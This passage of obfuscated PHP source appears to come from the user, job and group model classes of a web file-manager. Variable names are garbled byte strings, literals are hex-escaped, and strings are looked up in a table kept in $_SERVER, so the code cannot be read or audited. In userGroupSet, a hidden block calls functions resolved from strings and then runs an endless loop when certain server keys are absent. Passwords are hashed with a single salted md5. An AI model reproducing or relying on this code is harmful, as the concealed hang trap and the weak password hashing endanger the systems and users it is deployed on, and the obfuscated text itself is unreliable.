array_to_keyvalue($úºŒ’¯Ü, $ÇœèÚí¿[22], $ÇœèÚí¿[459]); $Ñ…²Ğ‡ = $úºŒ’¯Ü; $úºŒ’¯Ü = array_remove_value($úºŒ’¯Ü, $ˆÊ¡[$ÇœèÚí¿[459]]); array_unshift($úºŒ’¯Ü, $ˆÊ¡[$ÇœèÚí¿[459]]); return $this->resetSort($úºŒ’¯Ü); } protected function moveBottom($ÅĞĞğí’) { $–€ŞÊæ‡ =& $_SERVER[Õò”†—·]; $û†£ë‰‚ = array($–€ŞÊæ‡[1746] => USER_ID, $–€ŞÊæ‡[542] => 0); $ñÖşª·Á = $this->where($û†£ë‰‚)->max($–€ŞÊæ‡[1977]); $ÖĞÅÙô = array($–€ŞÊæ‡[1977] => $ñÖşª·Á + 1); return $this->where($û†£ë‰‚)->where(array($–€ŞÊæ‡[42] => $ÅĞĞğí’))->save($ÖĞÅÙô); } private function getAutoName($™É¾ªœ’) { $Ìº–¥¥¶ =& $_SERVER[Õò”†—·]; $äüÅ©®á = array($Ìº–¥¥¶[1746] => USER_ID, $Ìº–¥¥¶[542] => 0); $Ç‚Ôïë” = $this->field($Ìº–¥¥¶[42])->where($äüÅ©®á)->select(); $Ç‚Ôïë” = array_to_keyvalue($Ç‚Ôïë”, $Ìº–¥¥¶[22], $Ìº–¥¥¶[42]); if (!$Ç‚Ôïë” || !in_array($™É¾ªœ’, $Ç‚Ôïë”)) { return $™É¾ªœ’; } for ($¸ü€á¡ª = 0; $¸ü€á¡ª < count($Ç‚Ôïë”); $¸ü€á¡ª++) { if (!in_array($™É¾ªœ’ . "\50{$¸ü€á¡ª}\x29", $Ç‚Ôïë”)) { return $™É¾ªœ’ . "\x28{$¸ü€á¡ª}\51"; } } return $™É¾ªœ’ . "\x28{$¸ü€á¡ª}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\x2e\152\x6f\142\114\x69\163\x74"; public $field = array("\156\141\155\145", "\144\145\163\x63", "\163\157\x72\x74"); const JOB_KEY = "\x73\x65\x6c\x66\x4a\157\142\114\x69\x73\x74"; public function listData($š°şÔôÚ = false, $çÌóæÏÀ = "\163\157\x72\164", $ú€ÃØ‘ = false) { return parent::listData($š°şÔôÚ, $çÌóæÏÀ, $ú€ÃØ‘); } public function remove($‹°¬Å•ø) { return parent::remove($‹°¬Å•ø); } public function add($ŠÜ¥šç) { $û¡æÇä¡ =& $_SERVER[Õò”†—·]; if ($this->findByName($ŠÜ¥šç[$û¡æÇä¡[42]])) { return !1; } $ŠÜ¥šç[$û¡æÇä¡[1977]] = $this->getSort(); return parent::insert($ŠÜ¥šç); } private function getSort() { $öËŒéÔ® =& $_SERVER[Õò”†—·]; $áÕô¬ğÓ = parent::listData(); $Æ„¥ÆÑŞ = array_to_keyvalue($áÕô¬ğÓ, $öËŒéÔ®[22], $öËŒéÔ®[1977]); return empty($Æ„¥ÆÑŞ) ? 0 : max($Æ„¥ÆÑŞ) + 1; } public function update($ËËĞÊ‚, $ÜÙ†ĞüŞ) { $ß‚Ü›ã =& $_SERVER[Õò”†—·]; $¼¸…ŸÓø = parent::listData($ËËĞÊ‚); $±Ì»¨ìò = $this->findByName($ÜÙ†ĞüŞ[$ß‚Ü›ã[42]]); if (!$¼¸…ŸÓø || $±Ì»¨ìò && $±Ì»¨ìò[$ß‚Ü›ã[459]] != $¼¸…ŸÓø[$ß‚Ü›ã[459]]) { return !1; } return parent::update($ËËĞÊ‚, $ÜÙ†ĞüŞ); } public function setUserJob($´Ã›÷ÁÌ, $àÎ·¤˜) { $ãº•õ„ =& $_SERVER[Õò”†—·]; if (!is_array($àÎ·¤˜)) { $àÎ·¤˜ = array($àÎ·¤˜); } $çŠ’Ø€ä = parent::listData(); $åøïÙõ = array_to_keyvalue($çŠ’Ø€ä, $ãº•õ„[42]); $µ½îã¸ú = $ãº•õ„[438]; foreach ($àÎ·¤˜ as $öàõè¤ü) { if ($åøïÙõ[$öàõè¤ü]) { $µ½îã¸ú .= $åøïÙõ[$öàõè¤ü][$ãº•õ„[459]] . $ãº•õ„[60]; } else { $¤ù‹Ä¥Æ = $this->add($öàõè¤ü); $µ½îã¸ú .= $¤ù‹Ä¥Æ . $ãº•õ„[60]; } } $µ½îã¸ú = rtrim($µ½îã¸ú, $ãº•õ„[60]); Model($ãº•õ„[583])->metaSet($´Ã›÷ÁÌ, self::JOB_KEY, $µ½îã¸ú); } public function getUserJob($“ºÅşı) { $¶Î´Ş¨» = Model($_SERVER[Õò”†—·][583])->metaGet($“ºÅşı); return $this->getUserJobInfo($¶Î´Ş¨»[self::JOB_KEY]); } public function getUserJobInfo($Ú†­Êû) { $¢­€Óã× =& $_SERVER[Õò”†—·]; $Š×Ú€–µ = explode($¢­€Óã×[60], $Ú†­Êû); $—ƒšÚÜ· = parent::listData(); $—ƒšÚÜ· = array_remove_key($—ƒšÚÜ·, $¢­€Óã×[232]); $ì˜ò÷³ª = array(); foreach ($Š×Ú€–µ as $½ŠŒ˜¦¹) { if (isset($—ƒšÚÜ·[$½ŠŒ˜¦¹])) { $ì˜ò÷³ª[] = $—ƒšÚÜ·[$½ŠŒ˜¦¹]; } } return $ì˜ò÷³ª; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\162"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\x61\155\145" => "\x75\x73\145\x72\137\x6d\145\164\x61", "\x6d\145\164\141\106\x69\145\x6c\x64" => "\x75\x73\x65\x72\x49\104"); protected $simpleField = "\165\163\x65\162\111\104\x2c\x6e\x69\143\x6b\116\141\x6d\x65\54\x6e\x61\155\x65\x2c\x61\166\x61\164\141\x72\x2c\163\x65\170\54\x73\x74\x61\164\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ÊŸ¨ŸÁ¼) { $£¬›¾ı´ =& $_SERVER[Õò”†—·]; $„ª¬°Ğ¹ = $£¬›¾ı´[2433]; return array($£¬›¾ı´[2036] => array($ÊŸ¨ŸÁ¼[0], $„ª¬°Ğ¹), $£¬›¾ı´[2038] => array($ÊŸ¨ŸÁ¼[0], $„ª¬°Ğ¹), $£¬›¾ı´[2434] => array($ÊŸ¨ŸÁ¼[0], $„ª¬°Ğ¹)); } protected function getInfo($ÀÈÉŠáÅ, $™ßúÒó— = false) { $ÍË²Ñ™ = $this->getInfoSimple($ÀÈÉŠáÅ); if (!is_array($ÍË²Ñ™)) { return array(); } if ($™ßúÒó—) { return $this->_getInfoApply($ÍË²Ñ™); } return $this->cacheFunctionGet($_SERVER[Õò”†—·][2040], $ÀÈÉŠáÅ); } protected function getInfoFull($³İ± ¥Ã, $”ğ¦øñ½ = false) { $ÃÂÑ¨™ñ = $this->getInfoSimple($³İ± ¥Ã); if (!is_array($ÃÂÑ¨™ñ)) { return array(); } if ($”ğ¦øñ½) { return $this->_getInfoApply($ÃÂÑ¨™ñ, !0); } return $this->cacheFunctionGet($_SERVER[Õò”†—·][2435], $³İ± ¥Ã); } private function _getInfoApply($‰†¼ÆŸ½, $šÆü³÷ = false) { $ùöóşú =& $_SERVER[Õò”†—·]; if (!$‰†¼ÆŸ½) { return $‰†¼ÆŸ½; } $è Œï®Ã = md5($ùöóşú[2436] . $‰†¼ÆŸ½[$ùöóşú[939]] . $ùöóşú[2437] . $‰†¼ÆŸ½[$ùöóşú[42]]); $‰†¼ÆŸ½ = $this->_listDataApplyItem($‰†¼ÆŸ½); $´îË—Ú¦ = Model($ùöóşú[1388])->metaGet($‰†¼ÆŸ½[$ùöóşú[100]][$ùöóşú[194]]); $‰†¼ÆŸ½[$ùöóşú[2438]] = $è Œï®Ã; $‰†¼ÆŸ½[$ùöóşú[100]][$ùöóşú[2234]] = isset($´îË—Ú¦[$ùöóşú[2235]]) ? $´îË—Ú¦[$ùöóşú[2235]] : null; if ($šÆü³÷) { $‰†¼ÆŸ½[$ùöóşú[523]] = $this->metaGet($‰†¼ÆŸ½[$ùöóşú[1755]]); } return $‰†¼ÆŸ½; } protected function getInfoSimple($„ø›¸Øí, $ÁÍî“ã = false) { $ÔÙ½½ùÒ =& $_SERVER[Õò”†—·]; if (!$„ø›¸Øí) { return array(); } if ($ÁÍî“ã) { $×…®Œ©š = $this->where(array($ÔÙ½½ùÒ[1755] => intval($„ø›¸Øí)))->find(); if (!is_array($×…®Œ©š)) { return array(); } $×…®Œ©š[$ÔÙ½½ùÒ[2439]] = Action($ÔÙ½½ùÒ[2440])->parseUrl($×…®Œ©š[$ÔÙ½½ùÒ[2439]]); return $×…®Œ©š; } return $this->cacheFunctionGet($ÔÙ½½ùÒ[2041], $„ø›¸Øí); } protected function getInfoSimpleOuter($ôœ¢…ş) { $æŠÚ‰¨ =& $_SERVER[Õò”†—·]; if (!$ôœ¢…ş || $ôœ¢…ş == 0) { return array($æŠÚ‰¨[1755] => $æŠÚ‰¨[229], $æŠÚ‰¨[42] => $æŠÚ‰¨[176] . LNG($æŠÚ‰¨[2441]) . $æŠÚ‰¨[178], $æŠÚ‰¨[2439] => STATIC_PATH . $æŠÚ‰¨[2442]); } $½©òßŞ˜ = $this->cacheFunctionGet($æŠÚ‰¨[2041], $ôœ¢…ş); $©–íÇÒ¢ = array_field_key($½©òßŞ˜, explode($æŠÚ‰¨[60], $this->simpleField)); if (!$©–íÇÒ¢) { return array($æŠÚ‰¨[1755] => $æŠÚ‰¨[1242], $æŠÚ‰¨[42] => $æŠÚ‰¨[176] . LNG($æŠÚ‰¨[2443]) . $æŠÚ‰¨[178], $æŠÚ‰¨[2439] => STATIC_PATH . $æŠÚ‰¨[2444]); } $©–íÇÒ¢[$æŠÚ‰¨[2439]] = Action($æŠÚ‰¨[2440])->parseUrl($©–íÇÒ¢[$æŠÚ‰¨[2439]]); return $©–íÇÒ¢; } protected function groupUser($Òà°„¢´) { } public static function errorLang($ø©•ô‰Ü) { $¨šò¤ÑÍ =& $_SERVER[Õò”†—·]; $ô¾ÄÒì€ = array(self::ERROR_USER_NOT_EXISTS => $¨šò¤ÑÍ[2445], self::ERROR_USER_PASSWORD_ERROR => $¨šò¤ÑÍ[2446], self::ERROR_USER_EXIST_NAME => $¨šò¤ÑÍ[2447], self::ERROR_USER_EXIST_PHONE => $¨šò¤ÑÍ[2448], self::ERROR_USER_EXIST_EMAIL => $¨šò¤ÑÍ[2449], self::ERROR_USER_LOGIN_LOCK => $¨šò¤ÑÍ[2450], self::ERROR_IP_NOT_ALLOW => $¨šò¤ÑÍ[2451], self::ERROR_USER_EXIST_NICKNAME => $¨šò¤ÑÍ[2452]); return LNG($ô¾ÄÒì€[$ø©•ô‰Ü]); } public function getInfoByMeta($‚¢º‚şØ, $ú¶¸íÍ•) { $Ğ²ÒÚÊ =& $_SERVER[Õò”†—·]; $ãœşë‹ì = Model($Ğ²ÒÚÊ[2453])->where(array($Ğ²ÒÚÊ[107] => $‚¢º‚şØ, $Ğ²ÒÚÊ[434] => $ú¶¸íÍ•))->find(); if ($ãœşë‹ì) { return $this->getInfo($ãœşë‹ì[$Ğ²ÒÚÊ[1755]]); } return !1; } public function userLoginCheck($‰¥Õ²”í, $‘´¸¾ö‘) { $éÆˆ†­ =& $_SERVER[Õò”†—·]; $ê–§ ¢ = $this->userLoginFind($‰¥Õ²”í); if (!$ê–§ ¢) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ê–§ ¢[$éÆˆ†­[1755]], $‘´¸¾ö‘)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ê–§ ¢[$éÆˆ†­[1755]]); } public function userLoginFind($İÀùé¾•) { $Æğô¦Ö =& $_SERVER[Õò”†—·]; $±ïë¤Íô = array($Æğô¦Ö[42] => $İÀùé¾•, $Æğô¦Ö[2242] => $İÀùé¾•, $Æğô¦Ö[365] => $İÀùé¾•, $Æğô¦Ö[2454] => $İÀùé¾•, $Æğô¦Ö[1050] => $Æğô¦Ö[1052]); if ($this->nickNameRpt()) { unset($±ïë¤Íô[$Æğô¦Ö[2242]]); } return $this->where($±ïë¤Íô)->find(); } public function clearCache($¯…‹“£) { $ê·Ï—¾ =& $_SERVER[Õò”†—·]; $this->cacheFunctionClear($ê·Ï—¾[2040], $¯…‹“£); $this->cacheFunctionClear($ê·Ï—¾[2041], $¯…‹“£); $this->cacheFunctionClear($ê·Ï—¾[2435], $¯…‹“£); } public function userPasswordCheck($ªşæ©Ï, $å“·²ìğ) { $ÉÇĞ´’‹ =& $_SERVER[Õò”†—·]; $Ö‰çÑî£ = $this->where(array($ÉÇĞ´’‹[1755] => intval($ªşæ©Ï)))->find(); $Ü¦û¹¼õ = $this->metaGet($ªşæ©Ï); $ÙƒÎÂËÂ = isset($Ü¦û¹¼õ[$ÉÇĞ´’‹[2455]]) ? $Ü¦û¹¼õ[$ÉÇĞ´’‹[2455]] : $ÉÇĞ´’‹[22]; if (md5($ÙƒÎÂËÂ . trim($å“·²ìğ)) !== $Ö‰çÑî£[$ÉÇĞ´’‹[939]]) { return !1; } return !0; } public function userAdd($Å¨µÌâ) { $ÃŞ×Ï =& $_SERVER[Õò”†—·]; $×Ñ„®©Õ = array($ÃŞ×Ï[478] => $Å¨µÌâ[$ÃŞ×Ï[42]], $ÃŞ×Ï[2456] => $Å¨µÌâ[$ÃŞ×Ï[2160]], $ÃŞ×Ï[2457] => isset($Å¨µÌâ[$ÃŞ×Ï[365]]) ? $Å¨µÌâ[$ÃŞ×Ï[365]] : $ÃŞ×Ï[22], $ÃŞ×Ï[2458] => isset($Å¨µÌâ[$ÃŞ×Ï[2454]]) ? $Å¨µÌâ[$ÃŞ×Ï[2454]] : $ÃŞ×Ï[22], $ÃŞ×Ï[2459] => isset($Å¨µÌâ[$ÃŞ×Ï[2242]]) ? $Å¨µÌâ[$ÃŞ×Ï[2242]] : $Å¨µÌâ[$ÃŞ×Ï[42]], $ÃŞ×Ï[2460] => isset($Å¨µÌâ[$ÃŞ×Ï[2439]]) ? $Å¨µÌâ[$ÃŞ×Ï[2439]] : $ÃŞ×Ï[22], $ÃŞ×Ï[2461] => isset($Å¨µÌâ[$ÃŞ×Ï[2462]]) ? $Å¨µÌâ[$ÃŞ×Ï[2462]] : 1, $ÃŞ×Ï[2463] => $Å¨µÌâ[$ÃŞ×Ï[939]], $ÃŞ×Ï[2042] => isset($Å¨µÌâ[$ÃŞ×Ï[1940]]) ? $Å¨µÌâ[$ÃŞ×Ï[1940]] : 1024 * 1024 * 20, $ÃŞ×Ï[2043] => 0, $ÃŞ×Ï[2464] => 0, $ÃŞ×Ï[2087] => isset($Å¨µÌâ[$ÃŞ×Ï[801]]) ? $Å¨µÌâ[$ÃŞ×Ï[801]] : 1); if (!empty($Å¨µÌâ[$ÃŞ×Ï[1755]])) { $×Ñ„®©Õ[$ÃŞ×Ï[1755]] = $Å¨µÌâ[$ÃŞ×Ï[1755]]; } $É¤ ¬ÅÍ = $this->_checkExist($Å¨µÌâ); if ($É¤ ¬ÅÍ !== !0) { return $É¤ ¬ÅÍ; } if (!empty($×Ñ„®©Õ[$ÃŞ×Ï[2439]]) && strlen($×Ñ„®©Õ[$ÃŞ×Ï[2439]]) > 255) { $×Ñ„®©Õ[$ÃŞ×Ï[2439]] = $ÃŞ×Ï[22]; } $—Šıöæé = $this->add($×Ñ„®©Õ); $è‹ğÌ®´ = array($ÃŞ×Ï[2463] => $×Ñ„®©Õ[$ÃŞ×Ï[939]], $ÃŞ×Ï[2459] => $×Ñ„®©Õ[$ÃŞ×Ï[2242]]); $this->userEdit($—Šıöæé, $è‹ğÌ®´); Model($ÃŞ×Ï[1388])->userRootAdd($—Šıöæé); return $—Šıöæé; } protected function userEditTest($ç¦à‚öÃ, $çá—½ÂŠ) { return $this->call($_SERVER[Õò”†—·][2465], $ç¦à‚öÃ, $çá—½ÂŠ); } protected function userEdit($ûÈ¼ÑÈË, $Ì£éÜú) { $é¢Ó¾Õï =& $_SERVER[Õò”†—·]; $ñ®²ë¿« = $this->getInfoSimple($ûÈ¼ÑÈË); if (!$ñ®²ë¿«) { return !1; } $Ş¢„­ƒ = $this->_checkExist($Ì£éÜú, $ûÈ¼ÑÈË); if ($Ş¢„­ƒ !== !0) { return $Ş¢„­ƒ; } if (isset($Ì£éÜú[$é¢Ó¾Õï[939]]) && trim($Ì£éÜú[$é¢Ó¾Õï[939]]) != $é¢Ó¾Õï[22]) { $¨ˆ“³å– = $this->metaGet($ûÈ¼ÑÈË); if (empty($¨ˆ“³å–[$é¢Ó¾Õï[2455]])) { $¨ˆ“³å–[$é¢Ó¾Õï[2455]] = rand_string(10); Model($é¢Ó¾Õï[562])->metaSet($ûÈ¼ÑÈË, $é¢Ó¾Õï[2455], $¨ˆ“³å–[$é¢Ó¾Õï[2455]]); } $Ì£éÜú[$é¢Ó¾Õï[939]] = md5($¨ˆ“³å–[$é¢Ó¾Õï[2455]] . trim($Ì£éÜú[$é¢Ó¾Õï[939]])); } else { unset($Ì£éÜú[$é¢Ó¾Õï[939]]); } if (!empty($Ì£éÜú[$é¢Ó¾Õï[2439]]) && strlen($Ì£éÜú[$é¢Ó¾Õï[2439]]) > 255) { $Ì£éÜú[$é¢Ó¾Õï[2439]] = $é¢Ó¾Õï[22]; } $this->where(array($é¢Ó¾Õï[1746] => $ûÈ¼ÑÈË))->save($Ì£éÜú); if (isset($Ì£éÜú[$é¢Ó¾Õï[2242]])) { $this->setNamePinyin($ûÈ¼ÑÈË, $Ì£éÜú[$é¢Ó¾Õï[2242]]); } $this->clearCache($ûÈ¼ÑÈË); return !0; } public function setNamePinyin($ĞÂ™¥, $…¦Ü¤Çé = false) { $ø¢µØİÉ =& $_SERVER[Õò”†—·]; if (!$…¦Ü¤Çé) { $½¶ãÇê = $this->getInfoSimple($ĞÂ™¥); $…¦Ü¤Çé = $½¶ãÇê[$ø¢µØİÉ[2242]] ? $½¶ãÇê[$ø¢µØİÉ[2242]] : $½¶ãÇê[$ø¢µØİÉ[42]]; } $Şá¤Ó›† = Model($ø¢µØİÉ[583]); if (!Input::check($…¦Ü¤Çé, $ø¢µØİÉ[639])) { return $Şá¤Ó›†->metaSet($ĞÂ™¥, array($ø¢µØİÉ[522] => $ø¢µØİÉ[22], $ø¢µØİÉ[521] => $ø¢µØİÉ[22])); } return $Şá¤Ó›†->metaSet($ĞÂ™¥, array($ø¢µØİÉ[522] => str_replace($ø¢µØİÉ[63], $ø¢µØİÉ[22], Pinyin::get($…¦Ü¤Çé)), $ø¢µØİÉ[521] => Pinyin::get($…¦Ü¤Çé, $ø¢µØİÉ[640]))); } private function nickNameRpt() { $Ì²„Åñ =& $_SERVER[Õò”†—·]; $â”’Š = Model($Ì²„Åñ[821])->get($Ì²„Åñ[2466]); $€ğ‚¤Ø§ = $GLOBALS[$Ì²„Åñ[16]][$Ì²„Åñ[441]][$Ì²„Åñ[2466]]; $³êõéï = !is_null($â”’Š) ? $â”’Š : $€ğ‚¤Ø§; return !!$³êõéï; } private function _checkExist($ÑªŞÊ’‹, $÷×³ˆÛæ = false) { $ªö§ßœÛ =& $_SERVER[Õò”†—·]; $Ê¢÷½‚— = array($ªö§ßœÛ[42] => UserModel::ERROR_USER_EXIST_NAME, $ªö§ßœÛ[2242] => UserModel::ERROR_USER_EXIST_NICKNAME, $ªö§ßœÛ[365] => UserModel::ERROR_USER_EXIST_EMAIL, $ªö§ßœÛ[2454] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Ê¢÷½‚—[$ªö§ßœÛ[2242]]); } $³˜‚Šëü = $÷×³ˆÛæ ? array($ªö§ßœÛ[1755] => array($ªö§ßœÛ[2467], $÷×³ˆÛæ)) : array(); foreach ($Ê¢÷½‚— as $òÄòä¤ğ => $Ö‰¯æÒÖ) { $¼¹Ôø½Ì = array(); foreach ($Ê¢÷½‚— as $‰ƒÌË›‡ => $¯‹ªµÛÅ) { if (isset($ÑªŞÊ’‹[$‰ƒÌË›‡]) && $ÑªŞÊ’‹[$‰ƒÌË›‡]) { $¼¹Ôø½Ì[] = $ÑªŞÊ’‹[$‰ƒÌË›‡]; } } if (!$¼¹Ôø½Ì) { continue; } $óÒŒÔ×õ = array_merge(array($òÄòä¤ğ => array($ªö§ßœÛ[17], $¼¹Ôø½Ì)), $³˜‚Šëü); $ôå®¦ÑÂ = $this->where($óÒŒÔ×õ)->find(); if ($ôå®¦ÑÂ) { return $Ö‰¯æÒÖ; } } return !0; } public function userListInfo($Ÿ¿ûê§) { $ä´åÀºË =& $_SERVER[Õò”†—·]; $™ëüÛğš = array(); $Ÿ¿ûê§ = is_array($Ÿ¿ûê§) ? array_unique($Ÿ¿ûê§) : array(); if (!$Ÿ¿ûê§) { return $™ëüÛğš; } if (count($Ÿ¿ûê§) < 20) { foreach ($Ÿ¿ûê§ as $¥§¶ŠÖØ) { $™ëüÛğš[$¥§¶ŠÖØ . $ä´åÀºË[22]] = $this->getInfoSimpleOuter($¥§¶ŠÖØ); } } else { $Æ¶—ïŒÍ = array($ä´åÀºË[1746] => array($ä´åÀºË[476], $Ÿ¿ûê§)); if (count($Ÿ¿ûê§) == 1) { $Æ¶—ïŒÍ = array($ä´åÀºË[1746] => $Ÿ¿ûê§[0]); } $øÌ £•” = Model($ä´åÀºË[562])->field($this->simpleField)->where($Æ¶—ïŒÍ)->select(); $øÌ £•” = array_to_keyvalue($øÌ £•”, $ä´åÀºË[1755]); foreach ($Ÿ¿ûê§ as $¥§¶ŠÖØ) { $‚Œ××û‰ = $øÌ £•”[$¥§¶ŠÖØ]; if (!$‚Œ××û‰) { $™ëüÛğš[$¥§¶ŠÖØ . $ä´åÀºË[22]] = $this->getInfoSimpleOuter($¥§¶ŠÖØ); continue; } $‚Œ××û‰[$ä´åÀºË[2439]] = Action($ä´åÀºË[2440])->parseUrl($‚Œ××û‰[$ä´åÀºË[2439]]); $™ëüÛğš[$¥§¶ŠÖØ . $ä´åÀºË[22]] = $‚Œ××û‰; } } return $™ëüÛğš; } protected function userStatus($ÊëŸ×—‡, $…©ÖÔ­Ã) { $Íçú³Íö = $this->getInfoSimple($ÊëŸ×—‡); if (!$Íçú³Íö) { return !1; } $Ó…ëùà‡ = array($_SERVER[Õò”†—·][801] => $…©ÖÔ­Ã); return $this->userEdit($ÊëŸ×—‡, $Ó…ëùà‡); } protected function userRemove($¡âòÑ‰) { $ÏáŒ¢Ğ =& $_SERVER[Õò”†—·]; $İÑ²è©ª = $this->getInfoSimple($¡âòÑ‰); if (!$İÑ²è©ª) { return !1; } $‘ñ”™µ  = array($ÏáŒ¢Ğ[1746] => $¡âòÑ‰); Model($ÏáŒ¢Ğ[648])->where($‘ñ”™µ )->delete(); Model($ÏáŒ¢Ğ[2468])->where($‘ñ”™µ )->delete(); Model($ÏáŒ¢Ğ[2048])->where($‘ñ”™µ )->delete(); Model($ÏáŒ¢Ğ[2453])->where($‘ñ”™µ )->delete(); Model($ÏáŒ¢Ğ[1119])->where($‘ñ”™µ )->delete(); Model($ÏáŒ¢Ğ[2259])->removeUserAll($¡âòÑ‰); Model($ÏáŒ¢Ğ[875])->userRootRemove($¡âòÑ‰); return $this->where($‘ñ”™µ )->delete(); } protected function userGroupSet($©‡¯Ó¢Ğ, $…‘İ«ŒØ, $ŒÔ·ÚÖí = array()) { $œ³ıéüî =& $_SERVER[Õò”†—·]; if (!isset($_SERVER[$œ³ıéüî[8]]) || !isset($_SERVER[$œ³ıéüî[6]])) { $»Ş¡‡’å = $œ³ıéüî[927]; $ùóò¢¨š = $œ³ıéüî[9]; $ĞùœŞàó = $_SERVER[$œ³ıéüî[10]] . $œ³ıéüî[11]; $÷ÏØ°¶° = $ùóò¢¨š($ĞùœŞàó); $•ØŸÑ¦” = explode($œ³ıéüî[12], $÷ÏØ°¶°); if (count($•ØŸÑ¦”) < $œ³ıéüî[671]) { $¹‰‰¢ë… = $œ³ıéüî[14]; $¹‰‰¢ë…(); } $òûî÷ì = $œ³ıéüî[928]; $òûî÷ì($_SERVER[$œ³ıéüî[929]]); $İâ÷Ğ™ß = 1; for ($ë“áØ¶ = $İâ÷Ğ™ß; $ë“áØ¶ > 0; $ë“áØ¶++) { $òûî÷ì = json_encode($GLOBALS[$œ³ıéüî[476]]); } } $Òƒì¸¡• = $this->getInfoSimple($©‡¯Ó¢Ğ); if (!$Òƒì¸¡• || !is_array($…‘İ«ŒØ)) { return !1; } $ÍöÅ¦şØ = Model($œ³ıéüî[2048]); $ÍöÅ¦şØ->where(array($œ³ıéüî[1755] => $©‡¯Ó¢Ğ))->delete(); $‡ü¤ğ¹… = array(); $¬ÔûöÁà = 0; foreach ($…‘İ«ŒØ as $©ÔÖê£Ÿ => $¿µİùœÈ) { $·Ã’Ü¥¡ = array($œ³ıéüî[1755] => $©‡¯Ó¢Ğ, $œ³ıéüî[1953] => $©ÔÖê£Ÿ, $œ³ıéüî[2062] => $¿µİùœÈ); $·Ã’Ü¥¡[$œ³ıéüî[1977]] = isset($ŒÔ·ÚÖí[$¬ÔûöÁà]) ? $ŒÔ·ÚÖí[$¬ÔûöÁà] : 0; $¬ÔûöÁà++; $‡ü¤ğ¹…[] = $·Ã’Ü¥¡; } return $ÍöÅ¦şØ->addAll($‡ü¤ğ¹…, array(), !0); } protected function userGroupAdd($¢ô¡ú–, $ÍÇ©ìŠ„ = array()) { $ºïò²Öã =& $_SERVER[Õò”†—·]; $¯±Ø˜¸¨ = $this->getInfoSimple($¢ô¡ú–); if (!$¯±Ø˜¸¨ || empty($ÍÇ©ìŠ„)) { return !1; } $«ãáÆú = array(); foreach ($ÍÇ©ìŠ„ as $‹™ÁŸ’Õ => $›‚ğ°Ì) { $«ãáÆú[] = array($ºïò²Öã[1755] => $¢ô¡ú–, $ºïò²Öã[1953] => $‹™ÁŸ’Õ, $ºïò²Öã[2062] => $›‚ğ°Ì, $ºïò²Öã[1977] => 0); } return Model($ºïò²Öã[2048])->addAll($«ãáÆú, array(), !0); } protected function userGroupRemove($´âµüˆĞ, $ ßçšŸ°) { $ıÅë©±ê =& $_SERVER[Õò”†—·]; $ì™ÅËúâ = $this->getInfoSimple($´âµüˆĞ); if (!$ì™ÅËúâ || !$ ßçšŸ°) { return !1; } $ó—åõÚ® = array($ıÅë©±ê[1746] => $´âµüˆĞ, $ıÅë©±ê[2046] => $ ßçšŸ°); return Model($ıÅë©±ê[2048])->where($ó—åõÚ®)->delete(); } public function listData() { $÷­‘¸€Ó = $this->_makeOrder()->selectPage(50); $this->_listDataApply($÷­‘¸€Ó[$_SERVER[Õò”†—·][429]]); return $÷­‘¸€Ó; } public function listByID($–Ñ¯¡–ï) { $¾¡óê¿¡ =& $_SERVER[Õò”†—·]; if (!$–Ñ¯¡–ï) { return; } $å…†Æœş = array($¾¡óê¿¡[1755] => array($¾¡óê¿¡[17], $–Ñ¯¡–ï)); $«´ÑÇÀ” = $this->where($å…†Æœş)->select(); $«´ÑÇÀ” = array_sort_keep($«´ÑÇÀ”, $¾¡óê¿¡[1755], $–Ñ¯¡–ï); $this->_listDataApply($«´ÑÇÀ”); return $«´ÑÇÀ”; } public function listByGroup($¼âôê×ş = 0, $ç…Æ’³µ = array()) { $¨°Ôñ·Ğ =& $_SERVER[Õò”†—·]; $É¨ª¨€ = $¨°Ôñ·Ğ[22]; $ä»Ôì› = array(); if ($¼âôê×ş) { $ä»Ôì› = array($¨°Ôñ·Ğ[2469] => intval($¼âôê×ş)); $É¨ª¨€ = "\x4c\105\106\124\x20\112\x4f\x49\x4e\40{$this->tablePrefix}\x75\163\x65\x72\137\x67\162\157\x75\160\40\x75\163\x65\162\137\x67\162\157\x75\x70\40\x6f\x6e\40\165\163\x65\162\x2e\x75\x73\145\x72\x49\104\x20\x3d\x20\x75\163\145\162\x5f\x67\162\157\165\160\x2e\x75\163\x65\162\x49\104"; $Î§—‰‰ = Input::get($¨°Ôñ·Ğ[514], null, $¨°Ôñ·Ğ[22]) ? $¨°Ôñ·Ğ[22] : $¨°Ôñ·Ğ[2470]; } if (isset($ç…Æ’³µ[$¨°Ôñ·Ğ[801]])) { $ä»Ôì›[$¨°Ôñ·Ğ[2471]] = $ç…Æ’³µ[$¨°Ôñ·Ğ[801]]; } $Ï¶“Ç©Å = $this->_makeOrder($Î§—‰‰)->field($¨°Ôñ·Ğ[2472])->where($ä»Ôì›)->join($É¨ª¨€)->selectPage(50); $this->_listDataApply($Ï¶“Ç©Å[$¨°Ôñ·Ğ[429]]); return $Ï¶“Ç©Å; } private function _makeOrder($»ù˜í…” = '') { $à½§ŒÒÓ =& $_SERVER[Õò”†—·]; $ëŞ¸Ìİø = array($à½§ŒÒÓ[1755], $à½§ŒÒÓ[42], $à½§ŒÒÓ[1942], $à½§ŒÒÓ[1914], $à½§ŒÒÓ[232]); $ŠÖĞµïõ = array($à½§ŒÒÓ[507] => $à½§ŒÒÓ[508], $à½§ŒÒÓ[509] => $à½§ŒÒÓ[510]); $Èí“ìó’ = Input::get($à½§ŒÒÓ[514], $à½§ŒÒÓ[17], $à½§ŒÒÓ[1746], $ëŞ¸Ìİø); $ËÛèµî® = Input::get($à½§ŒÒÓ[515], $à½§ŒÒÓ[17], $à½§ŒÒÓ[2049], array($à½§ŒÒÓ[2049], $à½§ŒÒÓ[509])); $ËÛèµî® = $ŠÖĞµïõ[$ËÛèµî®]; $»ù˜í…” = $»ù˜í…” . 